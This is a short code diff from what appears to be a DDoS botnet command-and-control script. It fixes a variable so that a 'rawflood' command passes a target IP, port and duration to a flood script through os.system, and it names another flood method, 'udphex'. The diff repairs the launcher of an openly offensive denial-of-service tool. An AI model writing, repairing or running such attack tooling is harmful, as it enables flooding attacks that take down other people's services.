@@ -361,9 +361,9 @@ def main():
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 time = cnc.split()[3]
-                os.system(f'python3 rawflood.py {ip} {port} {duration}')
+                os.system(f'python3 rawflood.py {ip} {port} {time}')
             except IndexError:
-                print('Usage: rawflood <ip> <port> <duration>')
+                print('Usage: rawflood <ip> <port> <time>')
                 print('Example: rawflood 1.1.1.1 80 60')
 
         elif "udphex" in cnc:
